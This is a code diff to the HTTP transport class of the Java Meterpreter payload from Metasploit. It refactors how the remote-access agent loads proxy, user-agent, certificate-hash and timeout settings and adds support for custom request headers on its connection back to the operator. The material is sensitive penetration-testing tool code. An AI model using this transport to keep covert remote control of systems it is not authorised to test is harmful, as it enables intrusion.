@@ -2,7 +2,9 @@ package com.metasploit.meterpreter;
 
 import com.metasploit.meterpreter.command.Command;
 import com.metasploit.stage.ConfigParser;
+import com.metasploit.stage.HttpConnection;
 import com.metasploit.stage.PayloadTrustManager;
+import com.metasploit.stage.TransportConfig;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
@@ -21,12 +23,23 @@ public class HttpTransport extends Transport {
     private String proxy;
     private String proxyUser;
     private String proxyPass;
+    private String customHeaders;
     private byte[] certHash;
 
     public HttpTransport(Meterpreter met, String url) throws MalformedURLException {
         super(met, url);
-
         this.targetUrl = new URL(url);
+    }
+
+    public HttpTransport(Meterpreter met, String url, TransportConfig transportConfig) throws MalformedURLException {
+        this(met, url);
+        userAgent = transportConfig.user_agent;
+        proxy = transportConfig.proxy;
+        proxyUser = transportConfig.proxy_user;
+        proxyPass = transportConfig.proxy_pass;
+        certHash = transportConfig.cert_hash;
+        customHeaders = transportConfig.custom_headers;
+        setTimeouts(transportConfig);
     }
 
     public void bind(DataInputStream in, OutputStream rawOut) {
@@ -46,36 +59,6 @@ public class HttpTransport extends Transport {
         catch (MalformedURLException ex) {
           return false;
         }
-    }
-
-    public int parseConfig(byte[] configuration, int offset) {
-        offset = this.parseTimeouts(configuration, offset);
-
-        this.proxy = ConfigParser.readString(configuration, offset, ConfigParser.PROXY_HOST_LEN);
-        offset += ConfigParser.PROXY_HOST_LEN;
-
-        this.proxyUser = ConfigParser.readString(configuration, offset, ConfigParser.PROXY_USER_LEN);
-        offset += ConfigParser.PROXY_USER_LEN;
-
-        this.proxyPass = ConfigParser.readString(configuration, offset, ConfigParser.PROXY_PASS_LEN);
-        offset += ConfigParser.PROXY_PASS_LEN;
-
-        this.userAgent = ConfigParser.readString(configuration, offset, ConfigParser.UA_LEN);
-        offset += ConfigParser.UA_LEN;
-
-        this.certHash = null;
-        byte[] loadedHash = ConfigParser.readBytes(configuration, offset, ConfigParser.CERT_HASH_LEN);
-        offset += ConfigParser.CERT_HASH_LEN;
-
-        // we only store the cert hash value if it's got a value
-        for (int i = 0; i < loadedHash.length; i++) {
-            if (loadedHash[i] != 0) {
-                this.certHash = loadedHash;
-                break;
-            }
-        }
-
-        return offset;
     }
 
     public String getUserAgent() {
@@ -116,6 +99,10 @@ public class HttpTransport extends Transport {
 
     public void setCertHash(byte[] certHash) {
         this.certHash = certHash;
+    }
+
+    public String getCustomHeaders() {
+        return this.customHeaders;
     }
 
     public void disconnect() {
@@ -260,6 +247,7 @@ public class HttpTransport extends Transport {
 
         try {
             conn = this.targetUrl.openConnection();
+            HttpConnection.addRequestHeaders(conn, userAgent, customHeaders);
 
             if (this.targetUrl.getProtocol().equals("https")) {
                 try {
